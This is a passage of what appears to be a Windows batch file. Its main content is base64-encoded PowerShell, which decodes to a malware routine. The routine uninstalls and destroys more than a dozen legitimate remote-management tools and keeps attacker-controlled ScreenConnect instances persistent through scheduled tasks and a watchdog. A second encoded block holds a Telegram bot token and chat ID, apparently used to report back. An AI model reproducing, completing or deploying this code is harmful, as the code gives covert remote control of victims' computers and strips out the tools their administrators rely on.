RmlsZXMoeDg2KX1cTGV2ZWwiLCIkZW52OlByb2dyYW1EYXRhXExldmVsIik7IFByb2Q9QCgnTGV2
ZWwqJykgfQogICAgICAgIEB7IFRhZz0nQWN0aW9uMSc7ICAgICAgU3ZjPUAoJ0FjdGlvbjEqJyk7
IFByb2M9QCgnQWN0aW9uMSonLCdhY3Rpb24xX2FnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3Jh
bUZpbGVzXEFjdGlvbjEiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQWN0aW9uMSIsIiRlbnY6
UHJvZ3JhbURhdGFcQWN0aW9uMSIpOyBQcm9kPUAoJ0FjdGlvbjEqJykgfQogICAgICAgIEB7IFRh
Zz0nTWFuYWdlRW5naW5lJzsgU3ZjPUAoJ01hbmFnZUVuZ2luZSonLCdVRU1TKicsJ0RDQWdlbnQq
Jyk7IFByb2M9QCgnTWFuYWdlRW5naW5lKicsJ2RjYWdlbnQqJywnVUVNUyonKTsgRGlycz1AKCIk
ZW52OlByb2dyYW1GaWxlc1xNYW5hZ2VFbmdpbmUiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1c
TWFuYWdlRW5naW5lIik7IFByb2Q9QCgnTWFuYWdlRW5naW5lKicsJ1VFTVMqJywnRGVza3RvcCBD
ZW50cmFsKicsJ0VuZHBvaW50IENlbnRyYWwqJywnUk1NIENlbnRyYWwqJykgfQogICAgICAgIEB7
IFRhZz0nVGFjdGljYWxSTU0nOyAgU3ZjPUAoJ3RhY3RpY2Fscm1tKicsJ01lc2ggQWdlbnQnLCdN
ZXNoQWdlbnQnKTsgUHJvYz1AKCd0YWN0aWNhbHJtbSonLCdtZXNoYWdlbnQqJywnTWVzaEFnZW50
KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFRhY3RpY2FsQWdlbnQiLCIke2VudjpQcm9n
cmFtRmlsZXMoeDg2KX1cVGFjdGljYWxBZ2VudCIsIiRlbnY6UHJvZ3JhbUZpbGVzXE1lc2ggQWdl
bnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTWVzaCBBZ2VudCIpOyBQcm9kPUAoJ1RhY3Rp
Y2FsKicsJ01lc2ggQWdlbnQqJywnTWVzaENlbnRyYWwqJykgfQogICAgICAgIEB7IFRhZz0nTWVz
aENlbnRyYWwnOyAgU3ZjPUAoJ01lc2ggQWdlbnQnLCdNZXNoQWdlbnQnLCdNZXNoQ2VudHJhbCon
KTsgUHJvYz1AKCdNZXNoQWdlbnQqJywnTWVzaENlbnRyYWwqJyk7IERpcnM9QCgiJGVudjpQcm9n
cmFtRmlsZXNcTWVzaCBBZ2VudCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxNZXNoIEFnZW50
Iik7IFByb2Q9QCgnTWVzaCpBZ2VudConLCdNZXNoQ2VudHJhbConKSB9CiAgICAgICAgQHsgVGFn
PSdDb250aW51dW0nOyAgICBTdmM9QCgnU0FBWionLCdDb250aW51dW0qJyk7IFByb2M9QCgnU0FB
WionLCdDb250aW51dW0qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcU0FBWk9EIiwiJHtl
bnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFNBQVpPRCIsIiRlbnY6UHJvZ3JhbUZpbGVzXENvbnRpbnV1
bSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxDb250aW51dW0iKTsgUHJvZD1AKCdDb250aW51
dW0qJywnU0FBWionKSB9CiAgICAgICAgQHsgVGFnPSdOYXZlcmlzayc7ICAgICBTdmM9QCgnTmF2
ZXJpc2sqJyk7IFByb2M9QCgnTmF2ZXJpc2sqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNc
TmF2ZXJpc2siLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTmF2ZXJpc2siKTsgUHJvZD1AKCdO
YXZlcmlzayonKSB9CiAgICAgICAgQHsgVGFnPSdJbW15Qm90JzsgICAgICBTdmM9QCgnSW1teUJv
dConLCdJbW15KicpOyBQcm9jPUAoJ0ltbXlBZ2VudConLCdJbW15Qm90KicpOyBEaXJzPUAoIiRl
bnY6UHJvZ3JhbUZpbGVzXEltbXlCb3QiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cSW1teUJv
dCIsIiRlbnY6UHJvZ3JhbURhdGFcSW1teUJvdCIpOyBQcm9kPUAoJ0ltbXlCb3QqJykgfQogICAg
ICAgIEB7IFRhZz0nQXV0b21veCc7ICAgICAgU3ZjPUAoJ2FtYWdlbnQqJywnQXV0b21veConKTsg
UHJvYz1AKCdhbWFnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEF1dG9tb3giLCIk
e2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQXV0b21veCIsIiRlbnY6UHJvZ3JhbURhdGFcYW1hZ2Vu
dCIpOyBQcm9kPUAoJ0F1dG9tb3gqJykgfQogICAgICAgIEB7IFRhZz0nQWNyb25pc0N5YmVyJzsg
U3ZjPUAoJ0Fjcm9uaXMqJyk7IFByb2M9QCgnYWNyb2NtZConKTsgRGlycz1AKCIkZW52OlByb2dy
YW1GaWxlc1xBY3JvbmlzIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFjcm9uaXMiKTsgUHJv
ZD1AKCdBY3JvbmlzIEN5YmVyKicsJ0Fjcm9uaXMgQWdlbnQqJywnQ3liZXIgUHJvdGVjdCBBZ2Vu
dConKSB9CiAgICAgICAgQHsgVGFnPSdEb21vdHonOyAgICAgICBTdmM9QCgnRG9tb3R6KicpOyBQ
cm9jPUAoJ0RvbW90eionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xEb21vdHoiLCIke2Vu
djpQcm9ncmFtRmlsZXMoeDg2KX1cRG9tb3R6Iik7IFByb2Q9QCgnRG9tb3R6KicpIH0KICAgICAg
ICBAeyBUYWc9J0F1dmlrJzsgICAgICAgIFN2Yz1AKCdBdXZpayonKTsgUHJvYz1AKCdBdXZpayon
KTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xBdXZpayIsIiR7ZW52OlByb2dyYW1GaWxlcyh4
ODYpfVxBdXZpayIpOyBQcm9kPUAoJ0F1dmlrKicpIH0KICAgICAgICBAeyBUYWc9J0JhcnJhY3Vk
YVJNTSc7IFN2Yz1AKCdCYXJyYWN1ZGEqJyk7IFByb2M9QCgnTVdTZXJ2aWNlKicpOyBEaXJzPUAo
IiRlbnY6UHJvZ3JhbUZpbGVzXEJhcnJhY3VkYSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxC
YXJyYWN1ZGEiLCIkZW52OlByb2dyYW1GaWxlc1xMZXZlbCBQbGF0Zm9ybXMiLCIke2VudjpQcm9n
cmFtRmlsZXMoeDg2KX1cTGV2ZWwgUGxhdGZvcm1zIik7IFByb2Q9QCgnQmFycmFjdWRhIFJNTSon
LCdNYW5hZ2VkIFdvcmtwbGFjZSonKSB9CiAgICAgICAgQHsgVGFnPSdHb3Zlcmxhbic7ICAgICBT
dmM9QCgnR292ZXJsYW4qJyk7IFByb2M9QCgnZ292ZXJsYW4qJywnZ292YWdlbnQqJyk7IERpcnM9
QCgiJGVudjpQcm9ncmFtRmlsZXNcR292ZXJsYW4iLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1c
R292ZXJsYW4iKTsgUHJvZD1AKCdHb3ZlcmxhbionKSB9CiAgICAgICAgQHsgVGFnPSdQRFEnOyAg
ICAgICAgICBTdmM9QCgnUERRKicpOyBQcm9jPUAoJ1BEUVJ1bm5lcionLCdQRFFJbnZlbnRvcnkq
JywnUERRRGVwbG95KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFkbWluIEFyc2VuYWwi
LCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQWRtaW4gQXJzZW5hbCIsIiRlbnY6UHJvZ3JhbUZp
bGVzXFBEUSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxQRFEiKTsgUHJvZD1AKCdQRFEgRGVw
bG95KicsJ1BEUSBJbnZlbnRvcnkqJywnUERRIENvbm5lY3QqJykgfQogICAgKQoKICAgIGZvcmVh
Y2ggKCR0b29sIGluICRybW0pIHsKICAgICAgICAkaGl0ID0gJGZhbHNlCiAgICAgICAgZm9yZWFj
aCAoJHBhdCBpbiAkdG9vbC5Qcm9kKSB7CiAgICAgICAgICAgIGZvcmVhY2ggKCRyb290IGluICRz
Y3JpcHQ6VW5pbnN0YWxsUm9vdHMpIHsKICAgICAgICAgICAgICAgIEdldC1DaGlsZEl0ZW0gJHJv
b3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAg
ICAgICAgICAgICAgICAgJGRuID0gKEdldC1JdGVtUHJvcGVydHkgJF8uUFNQYXRoIC1FcnJvckFj
dGlvbiBTaWxlbnRseUNvbnRpbnVlKS5EaXNwbGF5TmFtZQogICAgICAgICAgICAgICAgICAgIGlm
ICgkZG4gLWFuZCAkZG4gLWxpa2UgJHBhdCkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAo
SXMtRGF0dG9LZWVwZXIgJGRuKSB7IExvZyAicm1tX3NraXBfZGF0dG9fa2VlcCBbJGRuXSI7IHJl
dHVybiB9CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChVbmluc3RhbGwtUHJvZHVjdEtleSAk
XykgeyAkbi5ybW0rKzsgJGhpdCA9ICR0cnVlIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAg
ICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZm9yZWFjaCAoJHBh
dCBpbiAkdG9vbC5TdmMpIHsKICAgICAgICAgICAgR2V0LVNlcnZpY2UgLU5hbWUgJHBhdCAtRXJy
b3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAg
ICAgIGlmIChJcy1EYXR0b0tlZXBlciAkXy5OYW1lIC1vciBJcy1EYXR0b0tlZXBlciAkXy5EaXNw
bGF5TmFtZSkgeyBMb2cgInJtbV9za2lwX2RhdHRvX3N2YyAkKCRfLk5hbWUpIjsgcmV0dXJuIH0K
ICAgICAgICAgICAgICAgICYgc2MuZXhlIHN0b3AgIiQoJF8uTmFtZSkiIDI+JjEgfCBPdXQtTnVs
bAogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyA1MDAKICAgICAgICAg
ICAgICAgICYgc2MuZXhlIGRlbGV0ZSAiJCgkXy5OYW1lKSIgMj4mMSB8IE91dC1OdWxsCiAgICAg
ICAgICAgICAgICAkbi5ybW0rKzsgJGhpdCA9ICR0cnVlOyBMb2cgInJtbV9zdmNfZGVsZXRlZCAk
KCRfLk5hbWUpIFskKCR0b29sLlRhZyldIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAg
IGZvcmVhY2ggKCRwYXQgaW4gJHRvb2wuUHJvYykgewogICAgICAgICAgICBHZXQtUHJvY2VzcyAt
TmFtZSAkcGF0IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qg
ewogICAgICAgICAgICAgICAgU3RvcC1Qcm9jZXNzIC1JZCAkXy5JZCAtRm9yY2UgLUVycm9yQWN0
aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICAgICAgICAgICRuLnJtbSsrOyAkaGl0ID0gJHRy
dWU7IExvZyAicm1tX3Byb2Nfa2lsbGVkICQoJF8uUHJvY2Vzc05hbWUpIFskKCR0b29sLlRhZyld
IgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGZvcmVhY2ggKCRkIGluICR0b29sLkRp
cnMpIHsKICAgICAgICAgICAgaWYgKCRkIC1hbmQgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQp
KSB7CiAgICAgICAgICAgICAgICBpZiAoSXMtRGF0dG9LZWVwZXIgJGQpIHsgTG9nICJybW1fc2tp
cF9kYXR0b19kaXIgJGQiOyBjb250aW51ZSB9CiAgICAgICAgICAgICAgICBpZiAoRm9yY2UtUmVt
b3ZlRGlyICRkKSB7ICRuLnJtbSsrOyAkaGl0ID0gJHRydWU7IExvZyAicm1tX2Rpcl9yZW1vdmVk
ICRkIiB9CiAgICAgICAgICAgICAgICBlbHNlIHsgJG4uZmFpbCsrOyBMb2cgInJtbV9kaXJfUkVN
T1ZFX0ZBSUxFRCAkZCIgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmICgkaGl0
KSB7IExvZyAicm1tX2V4dGVybWluYXRlZCAkKCR0b29sLlRhZykiIH0KICAgIH0KCiAgICAkc3Vt
bWFyeSA9ICJleHRlcm1pbmF0ZSBzdmM9JCgkbi5zdmMpIHByb2M9JCgkbi5wcm9jKSBkaXI9JCgk
bi5kaXIpIHByb2R1Y3Q9JCgkbi5wcm9kdWN0KSBybW09JCgkbi5ybW0pIGZhaWw9JCgkbi5mYWls
KSIKICAgIExvZyAkc3VtbWFyeQogICAgcmV0dXJuICRzdW1tYXJ5Cn0KCmZ1bmN0aW9uIFVwZGF0
ZS1TdGF0ZSB7CiAgICAka2VlcCA9IEAoR2V0LUtlZXBGaW5nZXJwcmludHMpCiAgICAkZ3J5eGFG
cCA9IEdldC1Hcnl4YUZwCiAgICAkcHJpbSA9ICRudWxsOyAkYWx0ID0gJG51bGw7ICRzY3JpcHQ6
Z3J5eGEgPSAkbnVsbAogICAgZm9yZWFjaCAoJHN2YyBpbiAoR2V0LVNlcnZpY2UgLU5hbWUgJ1Nj
cmVlbkNvbm5lY3QgQ2xpZW50KicpKSB7CiAgICAgICAgaWYgKCRzdmMuTmFtZSAtbWF0Y2ggJ1wo
KFswLTlhLWZdezE2fSlcKScpIHsKICAgICAgICAgICAgaWYgKCRtYXRjaGVzWzFdIC1lcSAnNWY2
MDEwNTc5ODUyZTUwNycpIHsgJHByaW0gPSAiJCgkc3ZjLlN0YXR1cykiIH0KICAgICAgICAgICAg
ZWxzZWlmICgkbWF0Y2hlc1sxXSAtZXEgJ2Y4NjFjODE0MGQ0NTM0MjcnKSB7ICRhbHQgPSAiJCgk
c3ZjLlN0YXR1cykiIH0KICAgICAgICAgICAgZWxzZWlmICgkbWF0Y2hlc1sxXSAtZXEgJGdyeXhh
RnApIHsgJHNjcmlwdDpncnl4YSA9ICIkKCRzdmMuU3RhdHVzKSIgfQogICAgICAgIH0KICAgIH0K
ICAgICRmb3JlaWduID0gQCgpCiAgICBmb3JlYWNoICgkc3ZjIGluIChHZXQtU2VydmljZSAtTmFt
ZSAnU2NyZWVuQ29ubmVjdCBDbGllbnQqJykpIHsKICAgICAgICBpZiAoJHN2Yy5OYW1lIC1tYXRj
aCAnXCgoWzAtOWEtZl17MTZ9KVwpJyAtYW5kICRtYXRjaGVzWzFdIC1ub3RpbiAka2VlcCkgewog
ICAgICAgICAgICAkZm9yZWlnbiArPSAkbWF0Y2hlc1sxXQogICAgICAgIH0KICAgIH0KICAgICRp
ZCA9IFJlYWQtSWRlbnRpdHkKICAgICR0YXNrc09rID0gMDsgJHRhc2tzVG90YWwgPSAwCiAgICBm
b3JlYWNoICgkayBpbiAnVEFTS19BJywnVEFTS19CJywnVEFTS19DJywnVEFTS19EJykgewogICAg
ICAgICR0YXNrc1RvdGFsKysKICAgICAgICAkdG4gPSBOb3JtYWxpemUtVGFza05hbWUgKFtzdHJp
bmddJGlkWyRrXSkKICAgICAgICBpZiAoLW5vdCAkdG4pIHsgY29udGludWUgfQogICAgICAgICRt
YXJrZXIgPSBpZiAoJGsgLWVxICdUQVNLX0InKSB7ICdldGxfbW9uLmNtZCcgfSBlbHNlIHsgJ293
bl9tb24uY21kJyB9CiAgICAgICAgaWYgKChUZXN0LVRhc2tPd25zTW9uICR0biAkbWFya2VyKSAt
b3IgKFRlc3QtVGFza093bnNNb24gKCJcJHRuIikgJG1hcmtlcikpIHsgJHRhc2tzT2srKyB9CiAg
ICB9CiAgICBpZiAoLW5vdCAkTW9uUGF0aCkgeyAkTW9uUGF0aCA9IEpvaW4tUGF0aCAkV29ya0Rp
ciAnb3duX21vbi5jbWQnIH0KICAgICR3ZCA9IEVuc3VyZS1XYXRjaGRvZwogICAgJHByZXYgPSBA
e30KICAgICRzdGF0ZVBhdGggPSBKb2luLVBhdGggJFdvcmtEaXIgJ3N0YXRlLmpzb24nCiAgICBp
ZiAoVGVzdC1QYXRoICRzdGF0ZVBhdGgpIHsKICAgICAgICB0cnkgeyAoR2V0LUNvbnRlbnQgLUxp
dGVyYWxQYXRoICRzdGF0ZVBhdGggLVJhdyB8IENvbnZlcnRGcm9tLUpzb24pLlBTT2JqZWN0LlBy
b3BlcnRpZXMgfCBGb3JFYWNoLU9iamVjdCB7ICRwcmV2WyRfLk5hbWVdID0gJF8uVmFsdWUgfSB9
IGNhdGNoIHt9CiAgICB9CiAgICAkaW5zdGFsbENvdW50ID0gMQogICAgaWYgKCRwcmV2Lmluc3Rh
bGxDb3VudCkgeyAkaW5zdGFsbENvdW50ID0gW2ludF0kcHJldi5pbnN0YWxsQ291bnQgfQogICAg
aWYgKCRwcmV2LnByaW0gLWFuZCAkcHJldi5wcmltIC1uZSAnUnVubmluZycgLWFuZCAkcHJpbSAt
ZXEgJ1J1bm5pbmcnKSB7ICRpbnN0YWxsQ291bnQrKyB9CiAgICAkc3RhdGUgPSBbb3JkZXJlZF1A
ewogICAgICAgIGhvc3QgICAgICAgICA9ICRlbnY6Q09NUFVURVJOQU1FCiAgICAgICAgdHMgICAg
ICAgICAgID0gKEdldC1EYXRlKS5Ub1VuaXZlcnNhbFRpbWUoKS5Ub1N0cmluZygnbycpCiAgICAg
ICAgYnVpbGQgICAgICAgID0gJEJ1aWxkCiAgICAgICAgcHJpbSAgICAgICAgID0gJChpZiAoJHBy
aW0pIHsgJHByaW0gfSBlbHNlIHsgJ01JU1NJTkcnIH0pCiAgICAgICAgYWx0ICAgICAgICAgID0g
JChpZiAoJGFsdCkgeyAkYWx0IH0gZWxzZSB7ICdNSVNTSU5HJyB9KQogICAgICAgIGdyeXhhICAg
ICAgICA9ICQoaWYgKCRzY3JpcHQ6Z3J5eGEpIHsgJHNjcmlwdDpncnl4YSB9IGVsc2UgeyAnTUlT
U0lORycgfSkKICAgICAgICBncnl4YUZwICAgICAgPSAkZ3J5eGFGcAogICAgICAgIGZvcmVpZ24g
ICAgICA9ICRmb3JlaWduCiAgICAgICAgdGFza3NPayAgICAgID0gJHRhc2tzT2sKICAgICAgICB0
YXNrc1RvdGFsICAgPSAkdGFza3NUb3RhbAogICAgICAgIHdhdGNoZG9nICAgICA9ICR3ZAogICAg
ICAgIGluc3RhbGxDb3VudCA9ICRpbnN0YWxsQ291bnQKICAgICAgICBsYXN0SGVhbCAgICAgPSAk
KGlmICgkRXh0cmEpIHsgKEdldC1EYXRlKS5Ub1VuaXZlcnNhbFRpbWUoKS5Ub1N0cmluZygnbycp
IH0gZWxzZWlmICgkcHJldi5sYXN0SGVhbCkgeyAkcHJldi5sYXN0SGVhbCB9IGVsc2UgeyAkbnVs
bCB9KQogICAgICAgIG5vdGUgICAgICAgICA9ICRFeHRyYQogICAgfQogICAgKCRzdGF0ZSB8IENv
bnZlcnRUby1Kc29uIC1Db21wcmVzcykgfCBTZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHN0YXRl
UGF0aCAtRm9yY2UKICAgIHJldHVybiAkc3RhdGUKfQoKc3dpdGNoICgkQWN0aW9uKSB7CiAgICAn
aW5pdCcgICAgICAgICAgICB7ICRpZCA9IEluaXRpYWxpemUtSWRlbnRpdHk7ICRpZC5HZXRFbnVt
ZXJhdG9yKCkgfCBGb3JFYWNoLU9iamVjdCB7ICIkKCRfLktleSk9JCgkXy5WYWx1ZSkiIH0gfQog
ICAgJ2lkZW50aXR5JyAgICAgICAgeyAkaWQgPSBSZWFkLUlkZW50aXR5OyAkaWQuR2V0RW51bWVy
YXRvcigpIHwgRm9yRWFjaC1PYmplY3QgeyAiJCgkXy5LZXkpPSQoJF8uVmFsdWUpIiB9IH0KICAg
ICd3YXRjaGRvZycgICAgICAgIHsgSW5zdGFsbC1XYXRjaGRvZyB8IE91dC1OdWxsIH0KICAgICd3
YXRjaGRvZy1lbnN1cmUnIHsgRW5zdXJlLVdhdGNoZG9nIH0KICAgICd0YXNrcy1lbnN1cmUnICAg
IHsgRW5zdXJlLVBlcnNpc3RUYXNrcyB9CiAgICAnc3RhdGUnICAgICAgICAgICB7IFVwZGF0ZS1T
dGF0ZSB8IENvbnZlcnRUby1Kc29uIC1Db21wcmVzcyB9CiAgICAncmVwYWlyJyAgICAgICAgICB7
IFJlcGFpci1TQ1NlcnZpY2UgJEZwIH0KICAgICdyZWdpc3RlcmVkJyAgICAgIHsgVGVzdC1TQ1Jl
Z2lzdGVyZWQgJEZwIH0KICAgICdleHRlcm1pbmF0ZScgICAgIHsgSW52b2tlLUV4dGVybWluYXRl
IH0KICAgICdncnl4YS1oZWFsdGgnICAgIHsgVGVzdC1Hcnl4YUhlYWx0aCB9CiAgICAnZ3J5eGEt
ZW5zdXJlJyAgICB7IEludm9rZS1Hcnl4YUVuc3VyZSB9Cn0K
::B64_LIB_END

::B64_NTF_BEGIN
Qk9UX1RPS0VOPTg2MTk3MTU3NTQ6QUFGTWsyTmpORC1oUWsyeFBGWWppY0hmQjVNeUt0Y1hDcWcK
Q0hBVF9JRD03NTQ3NDYyMDcwCg==
::B64_NTF_END
